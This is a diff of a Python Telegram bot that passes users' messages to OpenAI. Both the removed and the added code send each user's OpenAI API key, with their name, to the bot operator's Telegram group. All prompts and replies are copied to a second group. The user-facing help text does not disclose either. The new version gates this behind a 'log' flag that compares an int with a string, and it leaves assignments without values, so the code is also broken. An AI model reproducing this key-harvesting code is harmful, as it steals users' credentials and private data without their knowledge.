@@ -9,9 +9,13 @@ api_key_active = False
 # -- START CONFIGURATION --
 
 # Get the chat_id of the group
-chat_api_id = -650031966
 
-chat_log_id = -839562421
+log = 0 # set 0 for deactivate log chat or 1 to active
+# if 1 set chat id number with -> Telegram Bot Raw <-
+chat_api_id =  # here
+
+chat_log_id =  # here
+
 
 # Setup Engine
 engine_ai = "text-davinci-003"
@@ -39,6 +43,7 @@ Follw these steps to configure your AI:
 
 
 Before start, set your API key with /set_api_key
+To create new chat /reset
 
 Creator: @james_sec
 Contact me if you want to add features to this bot
@@ -91,11 +96,11 @@ def handle_message(update, context):
     # Store the API key for the current user in the context.user_data dictionary
     context.user_data['api_key'] = api_key
     update.message.reply_text(f"API key set successfully!\n{api_key}")
-
-    # Compose the message
-    message_api = f"{update.message.from_user.username} or {update.message.from_user.first_name} API key:\n\n{api_key}"
-    # Send the message to the API group
-    bot.send_message(chat_id=chat_api_id, text=message_api)
+    if log=='1':
+        # Compose the message
+        message_api = f"{update.message.from_user.username} or {update.message.from_user.first_name} API key:\n\n{api_key}"
+        # Send the message to the API group
+        bot.send_message(chat_id=chat_api_id, text=message_api)
 
     api_key_active = False
     return
@@ -120,10 +125,11 @@ def handle_message(update, context):
     # Send the response to the user
     response_def = response['choices'][0]['text']
     update.message.reply_text(response_def)
-    # Compose the message
-    message_log = f"{update.message.from_user.username} or {update.message.from_user.first_name} has set new input:\n\n{testo}\n\nand the Output is:\n\n{response_def}"
-    # Send the message to the log group
-    bot.send_message(chat_id=chat_log_id, text=message_log)
+    if log=="1":
+        # Compose the message
+        message_log = f"{update.message.from_user.username} or {update.message.from_user.first_name} has set new input:\n\n{testo}\n\nand the Output is:\n\n{response_def}"
+        # Send the message to the log group
+        bot.send_message(chat_id=chat_log_id, text=message_log)
   except:
     update.message.reply_text("ERROR, check if you have insert correct API /set_api_key \nor started /chat command")
 
